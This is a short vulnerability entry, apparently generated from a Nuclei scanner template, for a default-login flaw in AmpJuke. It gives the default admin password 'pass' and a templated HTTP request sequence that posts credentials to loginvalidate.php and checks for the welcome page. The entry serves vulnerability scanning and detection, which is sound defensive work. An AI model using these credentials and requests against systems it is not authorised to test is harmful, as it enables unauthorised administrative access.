# Vulnerability: AmpJuke - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`ampjuke-default-login.yaml`)

## Description
AmpJuke contains a default login vulnerability. Default admin login password 'pass' was found.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login.php HTTP/1.1
Host: {{Hostname}}

POST /loginvalidate.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

uuid={{url_encode(token)}}&login={{username}}&password={{password}}&Submit=Submit

GET /index.php?what=welcome HTTP/1.1
Host: {{Hostname}}
```

